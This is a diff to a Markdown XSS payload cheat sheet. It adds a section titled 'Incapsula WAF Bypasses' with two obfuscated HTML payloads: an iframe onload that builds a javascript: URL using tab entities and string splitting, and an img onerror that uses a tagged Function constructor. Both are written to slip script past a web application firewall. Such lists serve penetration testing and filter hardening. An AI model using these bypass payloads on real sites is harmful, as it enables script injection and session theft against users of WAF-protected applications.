@@ -64,6 +64,16 @@ Note: This kind of depends on what security level the application is set to. See
 >><marquee loop=1 width=0 onfinish=alert(1)>
 ```
 
+**Incapsula WAF Bypasses** by [@i_bo0om](https://twitter.com/i_bo0om)
+
+```html
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+```
+
+```html
+<img/src=q onerror='new Function`al\ert\`1\``'>
+```
+
 **jQuery < 3.0.0 XSS**
  by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)
 
